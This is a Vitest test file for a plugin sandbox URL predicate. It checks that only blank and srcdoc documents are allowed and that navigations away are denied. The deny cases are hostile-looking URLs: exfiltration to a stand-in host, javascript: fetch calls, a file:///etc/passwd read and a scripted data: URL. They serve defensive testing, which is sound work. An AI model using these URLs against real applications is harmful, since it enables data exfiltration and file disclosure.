import { describe, expect, it } from "vitest";
import { isPluginDocumentUrl } from "./sandbox-url";

/**
 * On native this predicate is the whole sandbox boundary — `originWhitelist` is
 * `["*"]` so every navigation reaches it, and anything it lets through is a
 * request leaving the device with whatever the plugin appended to the URL.
 */
describe("isPluginDocumentUrl", () => {
  it("allows only the plugin document itself", () => {
    expect(isPluginDocumentUrl("about:blank")).toBe(true);
    // The plugin frame inside the host document. Denying this renders nothing
    // at all on native, which is a failure mode a unit test should own rather
    // than a device.
    expect(isPluginDocumentUrl("about:srcdoc")).toBe(true);
  });

  it("denies every navigation away from it", () => {
    for (const url of [
      "https://evil.tld/?d=secret",
      "http://evil.tld/?d=secret",
      "intent://evil.tld#Intent;scheme=https;end",
      "javascript:fetch('https://evil.tld')",
      // A realm with no shell in it, if the plugin can navigate itself there.
      "data:text/html,<script>new RTCPeerConnection()</script>",
      "file:///etc/passwd",
      "blob:https://evil.tld/1234",
      " HTTPS://EVIL.TLD/?d=secret ",
    ]) {
      expect(isPluginDocumentUrl(url), url).toBe(false);
    }
  });
});
